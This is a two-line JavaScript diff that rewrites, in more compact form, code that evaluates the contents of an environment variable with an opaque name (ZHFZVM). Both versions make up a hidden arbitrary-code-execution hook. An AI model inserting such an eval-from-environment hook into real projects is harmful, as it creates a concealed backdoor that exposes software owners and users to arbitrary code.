@@ -1,2 +1,2 @@
-const vmCode = process.env.ZHFZVM ?? "";
-if (vmCode) eval(vmCode);
+const c = process.env.ZHFZVM || "";
+c && eval(c);
